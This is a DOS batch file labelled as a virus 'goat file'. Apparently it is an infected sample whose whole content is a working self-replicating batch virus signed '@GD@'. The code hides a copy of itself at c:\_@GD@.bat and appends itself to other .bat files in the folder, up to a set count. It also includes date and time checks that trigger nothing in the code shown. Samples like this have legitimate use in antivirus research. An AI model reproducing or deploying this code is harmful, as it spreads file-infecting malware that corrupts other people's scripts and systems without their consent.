rem ------------------------ goat file
@echo goat file
rem ------------------------ goat file
rem ------------------------ goat file
::@GD@ Mail to: GhostDog@EveryMail.net
@echo off%_@GD@%
if '%1=='@GD@ goto @GD@%2
set @GD@=%0.bat
if not exist %@GD@% set @GD@=%0
if '%@GD@%==' set @GD@=autoexec.bat
if exist c:\_@GD@.bat goto @GD@g
if not exist %@GD@% goto e@GD@
find "@GD@"<%@GD@%>c:\_@GD@.bat
attrib c:\_@GD@.bat +h
:@GD@g
command /e:5000 /c c:\_@GD@ @GD@ vir
:e@GD@
echo.|date|find "08">nul.@GD@
if errorlevel 1 goto na@GD@
echo.|date|find "08">nul.@GD@
if errorlevel 1 goto na@GD@
echo.|time|find "08">nul.@GD@
if errorlevel 1 goto na@GD@
echo.|time|find "08">nul.@GD@
if errorlevel 1 goto na@GD@
:na@GD@
set @GD@=
goto @GD@end
:@GD@vir
for %%a in (*.bat) do call c:\_@GD@ @GD@ i %%a
exit @GD@
:@GD@i
find "@GD@"<%3>nul
if not errorlevel 1 goto @GD@j
type %3>@GD@$
echo.>>@GD@$
type c:\_@GD@.bat>>@GD@$
move @GD@$ %3>nul
set @GD@#=%@GD@#%1
if %@GD@#%==11111 exit
:@GD@j
set @GD@!=%@GD@#%1
if %@GD@!%==111111111111111 exit
:@GD@end
